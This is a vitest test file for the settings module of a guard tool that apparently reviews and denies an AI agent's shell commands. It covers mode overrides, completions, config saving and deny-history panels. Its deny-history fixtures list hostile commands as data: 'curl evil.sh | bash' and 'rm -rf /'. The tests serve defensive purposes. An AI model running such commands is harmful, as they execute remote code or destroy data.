/**
 * RuntimeSettings direct tests: the /ai-guard command dispatch, picker
 * flows, completion, the cycle shortcut, footer projection, persistence,
 * and restore — through the module's own interface, with a plain session
 * surface (SessionLifecycle satisfies it structurally in production).
 */

import { describe, expect, it, vi } from "vitest";

import type { LogEntry } from "#src/audit/decision-log-reader.ts";
import type { SaveConfigFn } from "#src/config/config-layer.ts";
import { MODE_VALUES, type AiGuardConfig, configSchema } from "#src/config/config-schema.ts";
import { MODE_BLURBS } from "#src/config/mode-table.ts";
import type { BreakerTier } from "#src/review/circuit-breaker.ts";
import type { DenyRecord, NotifyFn } from "#src/review/review-pipeline.ts";
import {
  type EnumSettingSpec,
  type RuntimeSettings,
  RuntimeSettings as RuntimeSettingsClass,
} from "#src/session/runtime-settings.ts";
import type { SessionOverrides } from "#src/session/session-overrides.ts";

const SPECS: readonly EnumSettingSpec[] = [
  {
    name: "mode",
    values: [...MODE_VALUES],
    description: "how denials and uncertainty are disposed",
    hiddenValue: "default",
    cycleValues: ["default", "lenient", "permissive"],
    highlightValue: "permissive",
    optionDetails: MODE_BLURBS,
  },
];

/**
 * A command/shortcut UI context mock with spies.
 *
 * @param selectResult - What ui.select resolves with (undefined = cancel).
 * @returns The mock ctx.
 */
function makeUiCtx(selectResult?: string) {
  return {
    hasUI: true,
    ui: {
      notify: vi.fn<(message: string, type?: "info" | "warning" | "error") => void>(),
      setStatus: vi.fn<(key: string, text: string | undefined) => void>(),
      select: vi.fn<() => Promise<string | undefined>>(async () => selectResult),
    },
  };
}

/**
 * Build settings over a plain surface with the config default.
 *
 * @param overridesInit - Initial overrides (mutated by the settings).
 * @param saveConfig - Optional config-layer save stub (default: a path
 *   echo reporting a change).
 * @returns The settings, the overrides object, and the append spy.
 */
/** The seam-shaped stub options: what varies between settings tests. */
interface MakeSettingsOptions {
  /** Replaces the default spec list (the dual-spec menu test). */
  specs?: readonly EnumSettingSpec[];
  /** What the session's resetBreaker seam returns (default: not tripped). */
  resetTier?: BreakerTier;
  /** No live session (the no-session guard tests). */
  noSession?: boolean;
  /** Custom save-config stub (default: a path echo reporting a change). */
  saveConfig?: SaveConfigFn;
  /** The session's deny-history records (default: empty). */
  denyHistory?: DenyRecord[];
  /** The report command's log-read stub (default: no log). */
  readDecisionLog?: (home: string) => LogEntry[] | undefined;
}

function makeSettings(overridesInit: SessionOverrides = {}, options: MakeSettingsOptions = {}) {
  const overrides: SessionOverrides = { ...overridesInit };
  const appendEntry = vi.fn<(customType: string, data?: unknown) => void>();
  const notify = vi.fn<NotifyFn>();
  // The resetBreaker seam stub: records the call, answers with the tier.
  const resetBreaker = vi.fn<() => BreakerTier | undefined>(() => options.resetTier);
  const settings: RuntimeSettings = new RuntimeSettingsClass(
    {
      session: {
        session: options.noSession
          ? undefined
          : { config: configSchema.parse({ provider: "test", model: "test" }) },
        overrides,
        resetBreaker,
      },
      appendEntry,
      notify,
      saveConfig:
        options.saveConfig ??
        ((target) => ({ path: `/config-${target}.json`, created: false, changed: true })),
    },
    {
      notify,
      readDecisionLog: options.readDecisionLog ?? (() => undefined),
      home: "/home/test",
      readDenyHistory: () => options.denyHistory ?? [],
    },
    options.specs ?? SPECS,
  );
  return { settings, overrides, appendEntry, notify, resetBreaker };
}

describe("RuntimeSettings — command", () => {
  it("the direct form applies a value: override + persist + notify + footer", async () => {
    const { settings, overrides, appendEntry, notify } = makeSettings();
    const ctx = makeUiCtx();
    await settings.command.handler("mode lenient", ctx);

    expect(overrides.mode).toBe("lenient");
    expect(appendEntry).toHaveBeenCalledWith("ai-guard-setting", { mode: "lenient" });
    expect(notify).toHaveBeenCalledWith("mode = lenient (session override)", "info");
    expect(ctx.ui.setStatus).toHaveBeenCalledWith("ai-guard", "lenient (session)");
  });

  it("reset clears the override, persists null, and shows the config default", async () => {
    const { settings, overrides, appendEntry, notify } = makeSettings({ mode: "strict" });
    const ctx = makeUiCtx();
    await settings.command.handler("mode reset", ctx);

    expect(overrides.mode).toBeUndefined();
    expect(appendEntry).toHaveBeenCalledWith("ai-guard-setting", { mode: null });
    expect(notify).toHaveBeenCalledWith("mode = default (config default)", "info");
    // Default is the shipped baseline — the line clears instead of showing it.
    expect(ctx.ui.setStatus).toHaveBeenCalledWith("ai-guard", undefined);
  });

  it("unknown setting or invalid value notifies an error and changes nothing", async () => {
    const { settings, overrides, appendEntry, notify } = makeSettings();
    const ctx = makeUiCtx();
    await settings.command.handler("mode yolo", ctx);
    await settings.command.handler("surfaces bash", ctx);

    expect(overrides.mode).toBeUndefined();
    expect(appendEntry).not.toHaveBeenCalled();
    expect(notify).toHaveBeenCalledWith(
      'invalid value "yolo" for mode — valid values are strict|default|lenient|permissive|reset',
      "error",
    );
    expect(notify).toHaveBeenCalledWith(
      'unknown command "surfaces" (mode, save-config, breaker, report, denied)',
      "error",
    );
  });

  it("without an active session warns instead of crashing", async () => {
    const { settings, notify } = makeSettings({}, { noSession: true });
    const ctx = makeUiCtx();
    await settings.command.handler("mode lenient", ctx);
    expect(notify).toHaveBeenCalledWith("no active session (config not loaded)", "warning");
  });

  it("breaker reset clears through the seam and names what it does not touch", async () => {
    // The command's own behavior: it calls the seam once and formats the
    // returned tier. The breaker's reset semantics live behind the seam
    // (circuit-breaker tests) — here only the tier the seam reports.
    const { settings, notify, resetBreaker, appendEntry, overrides } = makeSettings(
      {},
      { resetTier: "consecutive" },
    );
    await settings.command.handler("breaker reset", makeUiCtx());
    expect(resetBreaker).toHaveBeenCalledOnce();
    expect(notify).toHaveBeenCalledWith(
      "circuit breaker cleared (was tripped) — verdict cache and overrides untouched; reviews resume immediately",
      "info",
    );
    // A pure counter reset: nothing persisted, no override touched.
    expect(appendEntry).not.toHaveBeenCalled();
    expect(overrides.mode).toBeUndefined();
  });

  it("breaker reset names the total tier when the seam reports it", async () => {
    // The accident scenario this copy was written for: the total tier
    // reached its hard cap.
    const { settings, notify } = makeSettings({}, { resetTier: "total" });
    await settings.command.handler("breaker reset", makeUiCtx());
    expect(notify).toHaveBeenCalledWith(
      "circuit breaker cleared (was total-tier tripped) — verdict cache and overrides untouched; reviews resume immediately",
      "info",
    );
  });

  it("breaker reset on an un-tripped breaker still answers cleanly", async () => {
    const { settings, notify } = makeSettings();
    await settings.command.handler("breaker reset", makeUiCtx());
    expect(notify).toHaveBeenCalledWith(
      "circuit breaker cleared — verdict cache and overrides untouched; reviews resume immediately",
      "info",
    );
  });

  it("a bare breaker verb names its one action instead of a misleading unknown-setting error", async () => {
    const { settings, notify, resetBreaker, overrides } = makeSettings();
    await settings.command.handler("breaker", makeUiCtx());
    expect(resetBreaker).not.toHaveBeenCalled();
    expect(overrides.mode).toBeUndefined();
    expect(notify).toHaveBeenCalledWith("breaker takes one action — reset", "error");
  });

  it("a wrong breaker argument is refused, not treated as a reset", async () => {
    const { settings, notify, resetBreaker } = makeSettings();
    await settings.command.handler("breaker trip", makeUiCtx());
    expect(resetBreaker).not.toHaveBeenCalled();
    expect(notify).toHaveBeenCalledWith("breaker takes one action — reset", "error");
  });

  it("the settings menu dispatches the breaker-reset entry", async () => {
    const { settings, notify, resetBreaker } = makeSettings({}, { resetTier: "consecutive" });
    const ctx = makeUiCtx("reset circuit breaker");
    await settings.command.handler("", ctx);
    expect(resetBreaker).toHaveBeenCalledOnce();
    expect(notify).toHaveBeenCalledWith(
      "circuit breaker cleared (was tripped) — verdict cache and overrides untouched; reviews resume immediately",
      "info",
    );
  });

  it("the settings menu and value picker apply the picked value", async () => {
    const { settings, overrides } = makeSettings();
    // Menu picks the (only) setting's label, then the value picker picks auto.
    const ctx = makeUiCtx();
    ctx.ui.select
      .mockResolvedValueOnce("mode — default (config)")
      .mockResolvedValueOnce("strict — the reviewer's allow is the only pass");
    await settings.command.handler("", ctx);

    expect(ctx.ui.select).toHaveBeenCalledWith(
      "ai-guard settings — pick a setting to adjust, save the current config, or reset the breaker",
      ["mode — default (config)", "save config", "reset circuit breaker"],
    );
    expect(overrides.mode).toBe("strict");
  });

  it("a second spec rides the same machinery (menu rows, direct form, footer)", async () => {
    // The generic spec machinery's first real multi-spec consumer —
    // nothing may assume a single setting.
    const { settings, overrides, appendEntry, notify } = makeSettings(
      {},
      {
        specs: [
          ...SPECS,
          {
            name: "notifyLevel",
            values: ["info", "warning", "error", "off"],
            description: "the minimum ambient notify level",
            hiddenValue: "info",
          },
        ],
      },
    );
    const ctx = makeUiCtx();
    ctx.ui.select.mockResolvedValueOnce("notifyLevel — info (config)").mockResolvedValueOnce("off");
    await settings.command.handler("", ctx);

    // Menu rows list BOTH settings (plus the save verbs); picking the
    // second spec and a value applies it like any other.
    expect(ctx.ui.select).toHaveBeenCalledWith(
      "ai-guard settings — pick a setting to adjust, save the current config, or reset the breaker",
      [
        "mode — default (config)",
        "notifyLevel — info (config)",
        "save config",
        "reset circuit breaker",
      ],
    );
    expect(overrides.notifyLevel).toBe("off");
    expect(appendEntry).toHaveBeenCalledWith("ai-guard-setting", { notifyLevel: "off" });
    expect(notify).toHaveBeenCalledWith("notifyLevel = off (session override)", "info");
    // Footer fragments join per spec: only the deviation renders.
    settings.syncFooter(ctx);
    expect(ctx.ui.setStatus).toHaveBeenCalledWith("ai-guard", "off (session)");
  });

  it("a commandName spec decouples the verb from the persistence key (kebab verbs, camelCase config)", async () => {
    // The shipped notifyLevel setting rides this: the /ai-guard verb is
    // `notify-level` (uniform kebab verb table) while the overrides key,
    // the persisted key, and the config field stay `notifyLevel` (the
    // config contract). Every surface is pinned here.
    const { settings, overrides, appendEntry, notify } = makeSettings(
      {},
      {
        specs: [
          {
            name: "notifyLevel",
            commandName: "notify-level",
            values: ["info", "warning", "error", "off"],
            description: "the ambient notify threshold",
            hiddenValue: "info",
          },
        ],
      },
    );
    const ctx = makeUiCtx();

    // Completion lists the kebab verb.
    const completions = settings.command.getArgumentCompletions("not");
    expect(completions).toEqual([
      { value: "notify-level", label: "notify-level — the ambient notify threshold" },
    ]);

    // The direct form dispatches on the verb…
    await settings.command.handler("notify-level warning", ctx);
    // …while the overrides key and the persisted key stay camelCase.
    expect(overrides.notifyLevel).toBe("warning");
    expect(appendEntry).toHaveBeenCalledWith("ai-guard-setting", { notifyLevel: "warning" });
    // The change notification speaks the verb.
    expect(notify).toHaveBeenCalledWith("notify-level = warning (session override)", "info");

    // The old camelCase word is no longer a verb (one word per setting —
    // the shipped surface is the kebab form only).
    const before = overrides.notifyLevel;
    await settings.command.handler("notifyLevel error", makeUiCtx());
    expect(overrides.notifyLevel).toBe(before);
    expect(notify).toHaveBeenCalledWith(
      'unknown command "notifyLevel" (notify-level, save-config, breaker, report, denied)',
      "error",
    );

    // The menu row and the value picker title speak the verb too.
    const menuCtx = makeUiCtx();
    menuCtx.ui.select
      .mockResolvedValueOnce("notify-level — warning (session)")
      .mockResolvedValueOnce("off");
    await settings.command.handler("", menuCtx);
    expect(menuCtx.ui.select).toHaveBeenCalledWith(
      "ai-guard settings — pick a setting to adjust, save the current config, or reset the breaker",
      ["notify-level — warning (session)", "save config", "reset circuit breaker"],
    );
    expect(menuCtx.ui.select).toHaveBeenCalledWith(
      "notify-level — current: notify-level — warning (session)",
      ["info", "warning", "error", "off", "reset"],
    );
    expect(overrides.notifyLevel).toBe("off");
  });

  it("cancelling the picker changes nothing", async () => {
    const { settings, overrides, appendEntry } = makeSettings();
    const ctx = makeUiCtx(undefined);
    await settings.command.handler("mode", ctx);
    await settings.command.handler("", ctx);

    expect(overrides.mode).toBeUndefined();
    expect(appendEntry).not.toHaveBeenCalled();
  });

  it("the picker paths require a dialog-capable UI; the direct form does not", async () => {
    const { settings, overrides, notify } = makeSettings();
    const noUi = makeUiCtx();
    noUi.hasUI = false;

    await settings.command.handler("mode", noUi);
    expect(notify).toHaveBeenCalledWith(
      "settings menu needs an interactive UI — use /ai-guard <setting> <value>",
      "error",
    );
    expect(overrides.mode).toBeUndefined();

    await settings.command.handler("mode lenient", noUi);
    expect(overrides.mode).toBe("lenient");
  });
});

describe("RuntimeSettings — completions", () => {
  it("completes setting names first, then the setting's values", () => {
    const { settings } = makeSettings();
    const completions = settings.command.getArgumentCompletions;
    expect(completions("mo")).toEqual([
      { value: "mode", label: "mode — how denials and uncertainty are disposed" },
    ]);
    expect(completions("mode ")).toEqual([
      { value: "strict", label: "strict" },
      { value: "default", label: "default" },
      { value: "lenient", label: "lenient" },
      { value: "permissive", label: "permissive" },
      { value: "reset", label: "reset" },
    ]);
    // Save verbs complete at the TOP level, not inside a setting.
    expect(completions("save")).toEqual([
      {
        value: "save-config",
        label: "save-config — persist the effective config for new sessions",
      },
    ]);
    // The target completes as the verb's argument.
    expect(completions("save-config ")).toEqual([
      { value: "global", label: "global" },
      { value: "project", label: "project" },
    ]);
    expect(completions("save-config pr")).toEqual([{ value: "project", label: "project" }]);
    expect(completions("mode de")).toEqual([{ value: "default", label: "default" }]);
    expect(completions("mode nope")).toBeNull();
    expect(completions("nope")).toBeNull();
    expect(completions("nope ")).toBeNull();
  });

  it("completes the breaker reset action alongside the verbs", () => {
    const { settings } = makeSettings();
    const completions = settings.command.getArgumentCompletions;
    expect(completions("bre")).toEqual([
      {
        value: "breaker",
        label: "breaker — clear both trip tiers (cache and overrides untouched)",
      },
    ]);
    expect(completions("breaker ")).toEqual([{ value: "reset", label: "reset" }]);
    expect(completions("breaker re")).toEqual([{ value: "reset", label: "reset" }]);
    expect(completions("breaker nope")).toBeNull();
  });

  it("the empty-prefix completion lists every entry in table order (settings first, then verbs)", () => {
    const { settings } = makeSettings();
    const completions = settings.command.getArgumentCompletions;
    expect(completions("")).toEqual([
      { value: "mode", label: "mode — how denials and uncertainty are disposed" },
      {
        value: "save-config",
        label: "save-config — persist the effective config for new sessions",
      },
      {
        value: "breaker",
        label: "breaker — clear both trip tiers (cache and overrides untouched)",
      },
      { value: "report", label: "report — suggest permission rules for repeated asks" },
      { value: "denied", label: "denied — browse this session's model denies" },
    ]);
  });

  it("a second-token completion is only offered by entries with an argument grammar", () => {
    const { settings } = makeSettings();
    const completions = settings.command.getArgumentCompletions;
    // Save verbs and the panels take no argument: no second-token offers.
    expect(completions("report ")).toBeNull();
    expect(completions("denied ")).toBeNull();
    expect(completions("report ")).toBeNull();
  });
});

describe("RuntimeSettings — shortcut", () => {
  it("cycles the session mode and wraps back to default", () => {
    const { settings, overrides } = makeSettings();
    const ctx = makeUiCtx();

    // The cycle visits the casual subset (default → lenient →
    // permissive), one press loosens one notch, and the wrap returns to
    // default — only strict stays reachable via the command.
    settings.shortcut.handler(ctx);
    expect(overrides.mode).toBe("lenient");
    settings.shortcut.handler(ctx);
    expect(overrides.mode).toBe("permissive");
    settings.shortcut.handler(ctx);
    expect(overrides.mode).toBe("default");
  });

  it("cycles from an override, one notch looser", () => {
    const { settings, overrides } = makeSettings({ mode: "lenient" });
    settings.shortcut.handler(makeUiCtx());
    expect(overrides.mode).toBe("permissive");
  });

  it("a value outside the cycle subset anchors to the subset start", () => {
    const { settings, overrides } = makeSettings({ mode: "strict" });
    settings.shortcut.handler(makeUiCtx());
    expect(overrides.mode).toBe("default");
    const { settings: s2, overrides: o2 } = makeSettings({ mode: "permissive" });
    s2.shortcut.handler(makeUiCtx());
    expect(o2.mode).toBe("default");
  });

  it("without an active session warns instead of crashing", () => {
    const { settings, notify } = makeSettings({}, { noSession: true });
    const ctx = makeUiCtx();
    expect(() => settings.shortcut.handler(ctx)).not.toThrow();
    expect(notify).toHaveBeenCalledWith("no active session (config not loaded)", "warning");
  });
});

describe("RuntimeSettings — restore + footer", () => {
  it("restore applies the persisted override through the stable overrides object", () => {
    const { settings, overrides } = makeSettings();
    settings.restore({
      getBranch: () =>
        [{ type: "custom", customType: "ai-guard-setting", data: { mode: "strict" } }] as never[],
    });
    expect(overrides.mode).toBe("strict");
  });

  it("restore with no entries clears any stale override", () => {
    const { settings, overrides } = makeSettings({ mode: "lenient" });
    settings.restore({ getBranch: () => [] });
    expect(overrides.mode).toBeUndefined();
  });

  it("syncFooter shows the effective value with the (session) marker while overridden", () => {
    const { settings } = makeSettings({ mode: "strict" });
    const ctx = makeUiCtx();
    settings.syncFooter(ctx);
    expect(ctx.ui.setStatus).toHaveBeenCalledWith("ai-guard", "strict (session)");
  });

  it("syncFooter renders the highlighted value in warning red", () => {
    const { settings } = makeSettings({ mode: "permissive" });
    const ctx = makeUiCtx();
    settings.syncFooter(ctx);
    expect(ctx.ui.setStatus).toHaveBeenCalledWith(
      "ai-guard",
      "\x1b[1;31mpermissive (session)\x1b[0m",
    );
  });

  it("syncFooter hides the default mode — the line clears instead of showing the baseline", () => {
    const { settings } = makeSettings();
    const ctx = makeUiCtx();
    settings.syncFooter(ctx);
    expect(ctx.ui.setStatus).toHaveBeenCalledWith("ai-guard", undefined);
  });

  it("syncFooter hides a session override back to default too", () => {
    const { settings } = makeSettings({ mode: "default" });
    const ctx = makeUiCtx();
    settings.syncFooter(ctx);
    expect(ctx.ui.setStatus).toHaveBeenCalledWith("ai-guard", undefined);
  });

  it("syncFooter without an active session sets nothing", () => {
    const { settings } = makeSettings({}, { noSession: true });
    const ctx = makeUiCtx();
    settings.syncFooter(ctx);
    expect(ctx.ui.setStatus).not.toHaveBeenCalled();
  });

  it("clearFooter clears the line", () => {
    const { settings } = makeSettings();
    const ctx = makeUiCtx();
    settings.clearFooter(ctx);
    expect(ctx.ui.setStatus).toHaveBeenCalledWith("ai-guard", undefined);
  });
});

describe("RuntimeSettings — save to config layer actions", () => {
  it("save-config global snapshots the full effective config (overrides merged)", async () => {
    const saveConfig = vi.fn<SaveConfigFn>((target) => ({
      path: `/cfg-${target}.json`,
      created: false,
      changed: true,
    }));
    const { settings, notify } = makeSettings({ mode: "lenient" }, { saveConfig });
    const ctx = makeUiCtx();

    await settings.command.handler("save-config global", ctx);

    // The snapshot merges the session override over the loaded config —
    // every field flows, so future command-configured settings ride along.
    expect(saveConfig).toHaveBeenCalledTimes(1);
    const [target, config] = saveConfig.mock.calls[0]!;
    expect(target).toBe("global");
    expect(config.mode).toBe("lenient"); // override won over the snapshot
    expect(config.provider).toBe("test"); // other fields intact
    expect(notify).toHaveBeenCalledWith(
      "saved to global config (cfg-global.json) — new sessions start from it; this session keeps current overrides",
      "info",
    );
  });

  it("save-config project passes the project target through", async () => {
    const saveConfig = vi.fn<SaveConfigFn>((target) => ({
      path: `/cfg-${target}.json`,
      created: false,
      changed: true,
    }));
    const { settings } = makeSettings({}, { saveConfig });
    const ctx = makeUiCtx();

    await settings.command.handler("save-config project", ctx);

    expect(saveConfig.mock.calls[0]![0]).toBe("project");
  });

  it("notifies a refusal and changes nothing when the save errors", async () => {
    const { settings, notify } = makeSettings(
      {},
      {
        saveConfig: () => ({
          path: "/cfg.json",
          created: false,
          changed: false,
          error: "not valid JSONC",
        }),
      },
    );
    const ctx = makeUiCtx();

    await settings.command.handler("save-config global", ctx);

    expect(notify).toHaveBeenCalledWith(
      "could not save to global config — not valid JSONC",
      "error",
    );
  });

  it("a no-override session saves the config's own value — no dead key shadows", async () => {
    const saveConfig = vi.fn<SaveConfigFn>(() => ({
      path: "/cfg.json",
      created: false,
      changed: true,
    }));
    const { settings, overrides } = makeSettings({}, { saveConfig });
    settings.restore({ getBranch: () => [] });
    const ctx = makeUiCtx();

    await settings.command.handler("save-config global", ctx);

    expect(saveConfig.mock.calls[0]![1].mode).toBe("default");
    expect("mode" in overrides).toBe(false); // restore-noop left no dead key
  });

  it("save after an override reset carries the config value — the undefined-shadow is gone", async () => {
    const saveConfig = vi.fn<SaveConfigFn>(() => ({
      path: "/cfg.json",
      created: false,
      changed: true,
    }));
    const { settings, overrides } = makeSettings({ mode: "lenient" }, { saveConfig });
    const ctx = makeUiCtx();

    await settings.command.handler("mode reset", ctx); // deletes the override
    await settings.command.handler("save-config global", ctx);

    expect(saveConfig.mock.calls[0]![1].mode).toBe("default");
    expect("mode" in overrides).toBe(false);
  });

  it("reset deletes the override key outright (present ⇒ defined invariant)", () => {
    const { settings, overrides } = makeSettings({ mode: "lenient" });
    const ctx = makeUiCtx();
    void settings.command.handler("mode reset", ctx);
    expect("mode" in overrides).toBe(false);
    expect(overrides.mode).toBeUndefined();
  });

  it("the direct save form needs no picker UI — hasUI=false still saves", async () => {
    const saveConfig = vi.fn<SaveConfigFn>(() => ({
      path: "/cfg.json",
      created: false,
      changed: true,
    }));
    const { settings } = makeSettings({}, { saveConfig });
    const noUi = makeUiCtx();
    noUi.hasUI = false;

    await settings.command.handler("save-config global", noUi);

    expect(saveConfig).toHaveBeenCalledTimes(1);
    expect(saveConfig.mock.calls[0]![0]).toBe("global");
  });

  it("the root menu's save row opens the target picker, then applies the direction", async () => {
    const saveConfig = vi.fn<SaveConfigFn>(() => ({
      path: "/cfg.json",
      created: false,
      changed: true,
    }));
    const { settings } = makeSettings({}, { saveConfig });
    const ctx = makeUiCtx();
    ctx.ui.select.mockResolvedValueOnce("save config").mockResolvedValueOnce("project");
    await settings.command.handler("", ctx);

    // Two-step menu: the save row, then the target layer.
    expect(ctx.ui.select).toHaveBeenCalledWith("save config — pick a target layer", [
      "global",
      "project",
    ]);
    expect(saveConfig.mock.calls[0]![0]).toBe("project");
  });

  it("a bare save-config opens the target picker (the direct form works everywhere)", async () => {
    const saveConfig = vi.fn<SaveConfigFn>(() => ({
      path: "/cfg.json",
      created: false,
      changed: true,
    }));
    const { settings } = makeSettings({}, { saveConfig });
    const ctx = makeUiCtx();
    ctx.ui.select.mockResolvedValueOnce("global");
    await settings.command.handler("save-config", ctx);

    expect(saveConfig.mock.calls[0]![0]).toBe("global");
  });

  it("a bare save-config without an interactive UI names the direct form", async () => {
    const { settings, notify } = makeSettings();
    const noUi = makeUiCtx();
    noUi.hasUI = false;
    await settings.command.handler("save-config", noUi);

    expect(notify).toHaveBeenCalledWith(
      "save-config needs an interactive UI — use /ai-guard save-config <global|project>",
      "error",
    );
  });

  it("a save-config with a wrong target names what it takes", async () => {
    const { settings, notify } = makeSettings();
    await settings.command.handler("save-config yolo", makeUiCtx());

    expect(notify).toHaveBeenCalledWith(
      "save-config takes one target — global or project",
      "error",
    );
  });

  it("reports when the layer already matches (nothing written)", async () => {
    const { settings, notify } = makeSettings(
      {},
      {
        saveConfig: () => ({
          path: "/cfg.json",
          created: false,
          changed: false,
        }),
      },
    );
    const ctx = makeUiCtx();

    await settings.command.handler("save-config global", ctx);

    expect(notify).toHaveBeenCalledWith("global config already matches — nothing written", "info");
  });
});

describe("RuntimeSettings — picker stays plain for the highlighted value", () => {
  it("applies a plain permissive pick and notifies at warning level, undecorated", async () => {
    const { settings, overrides, notify } = makeSettings();
    const ctx = makeUiCtx("permissive — only clear high-danger requests are blocked");
    await settings.command.handler("mode", ctx);
    expect(overrides.mode).toBe("permissive");
    // The command surface is plain text — the warning-red emphasis is
    // footer-only. The severity bump stays.
    expect(notify).toHaveBeenCalledWith("mode = permissive (session override)", "warning");
  });
});

describe("RuntimeSettings — settings-menu labels stay plain", () => {
  it("renders the mode label undecorated and resolves a plain pick", async () => {
    const { settings, overrides } = makeSettings({ mode: "permissive" });
    const menuOptions: string[][] = [];
    let calls = 0;
    const select = vi.fn<(title: string, options: string[]) => Promise<string | undefined>>(
      async (title, options) => {
        if (calls++ === 0) {
          menuOptions.push(options);
          return "mode — permissive (session)";
        }
        return "permissive";
      },
    );
    const ctx = {
      hasUI: true,
      ui: { notify: vi.fn<() => void>(), setStatus: vi.fn<() => void>(), select },
    } as never;
    await settings.command.handler("", ctx);
    expect(overrides.mode).toBe("permissive");
    // The menu label is plain — the warning-red emphasis is footer-only.
    expect(menuOptions[0]![0]).toBe("mode — permissive (session)");
  });

  it("the menu lists only menu-reachable entries — the read-only panels stay typed-verb-only", async () => {
    // report/denied are entry-table rows (completion + dispatch) but NOT
    // menu rows (menuLabel undefined): the settings menu's surface is a
    // shipped decision — adding a menuLabel to a panel silently widens
    // the menu unless this trips.
    const { settings } = makeSettings();
    const menuOptions: string[][] = [];
    const select = vi.fn<(title: string, options: string[]) => Promise<string | undefined>>(
      async (_title, options) => {
        menuOptions.push(options);
        return undefined; // cancel
      },
    );
    const ctx = {
      hasUI: true,
      ui: { notify: vi.fn<() => void>(), setStatus: vi.fn<() => void>(), select },
    } as never;
    await settings.command.handler("", ctx);
    const labels = menuOptions[0]!;
    // Exactly the menu-reachable rows: the specs (mode in this fixture)
    // plus the save action and the breaker reset — no panel rows.
    expect(labels).toEqual(["mode — default (config)", "save config", "reset circuit breaker"]);
  });
});

/**
 * A log fixture: n same-context model-gate reviews of one target.
 *
 * @param target - The reviewed value.
 * @param n - How many reviews.
 * @param contextHash - The shared context fingerprint (default "ctxh1").
 * @returns The log-entry fixtures.
 */
function repeatedEntries(target: string, n: number, contextHash = "ctxh1") {
  return Array.from({ length: n }, (_, i) => ({
    event: "ai_guard.decision",
    gate: "model",
    requestId: `r${i}`,
    surface: "bash",
    target,
    contextHash,
    verdict: "allow",
  }));
}

describe("RuntimeSettings — report command", () => {
  it("notifies a friendly message when no review log exists", async () => {
    const { settings, notify } = makeSettings();
    await settings.command.handler("report", makeUiCtx());
    expect(notify).toHaveBeenCalledWith("no review log found — nothing to report yet", "info");
  });

  it("notifies when the log has no repeated same-context asks", async () => {
    const { settings, notify } = makeSettings(
      {},
      { readDecisionLog: () => repeatedEntries("git status", 2) },
    );
    await settings.command.handler("report", makeUiCtx());
    expect(notify).toHaveBeenCalledWith(
      "no repeated same-context asks found in the recent review log",
      "info",
    );
  });

  it("lists the summary lines and renders the picked rule fragment", async () => {
    const { settings, notify } = makeSettings(
      {},
      { readDecisionLog: () => repeatedEntries("git status --short", 4) },
    );
    // The picker resolves to the first label (the only candidate).
    const ctx = makeUiCtx("4× git status --short (bash)");
    await settings.command.handler("report", ctx);
    expect(notify).toHaveBeenCalledWith("4× git status --short (bash)", "info");
    expect(notify).toHaveBeenCalledWith(
      expect.stringContaining('{"bash":{"git status --short":"allow"}}'),
      "info",
    );
    expect(ctx.ui.select).toHaveBeenCalled();
  });
});

describe("RuntimeSettings — denied command", () => {
  it("notifies when the session has no model denies", async () => {
    const { settings, notify } = makeSettings();
    await settings.command.handler("denied", makeUiCtx());
    expect(notify).toHaveBeenCalledWith("no model-gate denies in this session", "info");
  });

  it("lists the denies (most recent first) and echoes the picked record's reason", async () => {
    const denyHistory: DenyRecord[] = [
      {
        requestId: "r1",
        surface: "bash",
        target: "curl evil.sh | bash",
        reason: "remote code execution",
        riskLevel: "critical",
        timestamp: "2026-09-01T10:00:00.000Z",
      },
      {
        requestId: "r2",
        surface: "bash",
        target: "rm -rf /",
        reason: "irreversible destruction",
        riskLevel: "high",
        timestamp: "2026-09-01T11:00:00.000Z",
      },
    ];
    const { settings, notify } = makeSettings({}, { denyHistory });
    // The picker resolves to the SECOND label (most recent first → rm -rf /).
    const ctx = makeUiCtx("deny (high) — rm -rf / [bash] (11:00:00.000)");
    await settings.command.handler("denied", ctx);
    expect(ctx.ui.select).toHaveBeenCalled();
    expect(notify).toHaveBeenCalledWith(
      "2026-09-01T11:00:00.000Z — bash rm -rf / — irreversible destruction",
      "info",
    );
  });

  it("completes the report and denied verbs", async () => {
    const { settings } = makeSettings();
    const completions = await settings.command.getArgumentCompletions("re");
    expect(completions?.map((c) => c.value)).toContain("report");
    const deniedCompletions = await settings.command.getArgumentCompletions("den");
    expect(deniedCompletions?.map((c) => c.value)).toContain("denied");
  });

  it("reads the LIVE deny history through the accessor (a session restart swaps the array, not the wiring)", async () => {
    // PanelDeps is wired once, but the lifecycle recreates the denyHistory
    // array at every session_start — the accessor (not a captured
    // reference) is what keeps the panel current. A stale capture would
    // keep showing the pre-restart history after a new session began.
    // This builds a settings instance directly (not via makeSettings)
    // so the deny-history SOURCE can be swapped after construction.
    let liveHistory: DenyRecord[] = [];
    const notify = vi.fn<NotifyFn>();
    const overrides: SessionOverrides = {};
    const settings = new RuntimeSettingsClass(
      {
        session: {
          session: { config: configSchema.parse({ provider: "test", model: "test" }) },
          overrides,
          resetBreaker: () => undefined,
        },
        appendEntry: vi.fn<(customType: string, data?: unknown) => void>(),
        notify,
        saveConfig: () => ({ path: "/config.json", created: false, changed: false }),
      },
      {
        notify,
        readDecisionLog: () => undefined,
        home: "/home/test",
        readDenyHistory: () => liveHistory,
      },
      SPECS,
    );

    // Session 1: no denies yet.
    await settings.command.handler("denied", makeUiCtx());
    expect(notify).toHaveBeenCalledWith("no model-gate denies in this session", "info");

    // Session 2: the lifecycle recreated the array — same wiring, new array.
    liveHistory = [
      {
        requestId: "r1",
        surface: "bash",
        target: "rm -rf /tmp/x",
        reason: "destruction outside intent",
        riskLevel: "high",
        timestamp: "2026-09-02T10:00:00.000Z",
      },
    ];
    const ctx = makeUiCtx("deny (high) — rm -rf /tmp/x [bash] (10:00:00.000)");
    await settings.command.handler("denied", ctx);
    expect(ctx.ui.select).toHaveBeenCalled();
    expect(notify).toHaveBeenCalledWith(
      "2026-09-02T10:00:00.000Z — bash rm -rf /tmp/x — destruction outside intent",
      "info",
    );
  });
});
